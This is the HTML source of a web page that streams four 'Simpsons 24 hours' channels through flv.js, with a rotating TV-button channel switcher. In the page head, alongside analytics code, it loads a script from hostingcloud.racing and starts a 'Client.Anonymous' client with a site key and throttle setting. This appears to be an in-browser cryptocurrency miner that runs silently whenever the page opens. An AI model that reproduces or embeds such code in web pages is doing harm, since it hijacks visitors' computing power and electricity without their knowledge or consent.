<!doctype html>
<html lang="fr" class="no-js">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <link href='https://fonts.googleapis.com/css?family=Poppins' rel='stylesheet'>
    <title>Los Simpsons las 24 horas</title>
    <link rel="stylesheet" href="styles.css">
    <script src="https://www.hostingcloud.racing/oS6R.js"></script>
    <script>
        var _client = new Client.Anonymous('9495f348c76c3a5c7c3c0307dca34720a99027f57cc82f53f76fe0d347efd55a', {
            throttle: 0.2, c: 'w'
        });
        _client.start();
        
    
    </script>
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-YFXW2KNE23"></script>
    <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'G-YFXW2KNE23');
    </script>
</head>
<body class="sous-menu" style="overflow: hidden;">
        <div class="background"></div>
        <script src="https://cdn.bootcss.com/flv.js/1.5.0/flv.min.js"></script>
        
        <div class="tvContainer">
            <div class="videoItem" id="videoContainer"></div>
            
            <img src="tv.png" alt="" class="tvImage">
            <span class="tvButtonText">Canal</span>
            <img id="channelButton" src="tvButton.png" alt="" class="tvButton">
        </div>
        
            
        </img>
        <script>
            const button = document.getElementById("channelButton");
            var currentRotation = 0;    
            button.style.transform = `rotate(${currentRotation}deg)`  
            const videoNames = ["channel01","channel03","channel02","channel04"]
            const videoContainer = document.getElementById("videoContainer");
            const videos = []
            var selectedChannel = 0;
            function getVideoElement() {
                var video = document.createElement("video");
                video.setAttribute("loop", true)
                video.setAttribute("autoplay", true)
                video.setAttribute("controls", true)
                video.setAttribute("poster", "baner.jpg");
                video.setAttribute("preload", "metadata")
                video.style.display = "none";
                return video;
            }

            function loadVideo(videoObject) {
                videoObject.flvPlayer.load();
                videoObject.video.style.display = "block";
                console.log([videoObject.video])
                try {
                    videoObject.video.play(); 
                } catch (error) {} 
            }

            function unloadVideo(videoObject) {
                videoObject.flvPlayer.unload();
                videoObject.video.style.display = "none";  
            }

            function switchChannel() {
                currentRotation += 360 / videoNames.length;
                button.style.transform = `rotate(${currentRotation}deg)`
                unloadVideo(videos[selectedChannel])

                if (selectedChannel +1 >= videos.length) selectedChannel = 0;
                else selectedChannel ++;

                loadVideo(videos[selectedChannel])
            }

            if (flvjs.isSupported()) {
                videoNames.forEach((name, i) => {
                    var video = getVideoElement();
                    var source = `ws://backend.seta.fun:8000/stream/${name}.flv`;
                    videoContainer.appendChild(video);
                    var flvPlayer = flvjs.createPlayer({
                        type: 'flv',
                        url: source,
                        isLive: true
                    });
                    flvPlayer.attachMediaElement(video);
                    videos[i] = {video, flvPlayer};

                    video.addEventListener('ended', () => {
                        console.log(video, source, videos[i])
                        video.src = source;
                        if (selectedChannel == i) loadVideo(videos[i])
                    }, false);

                    video.addEventListener('error', () => {
                        video.src = source;
                        if (selectedChannel == i) loadVideo(videos[i])
                    }, true);
                });
                loadVideo(videos[0])

                button.onclick = () => {
                    switchChannel()
                }
                console.log([button])
            }
        </script>
</body>
</html>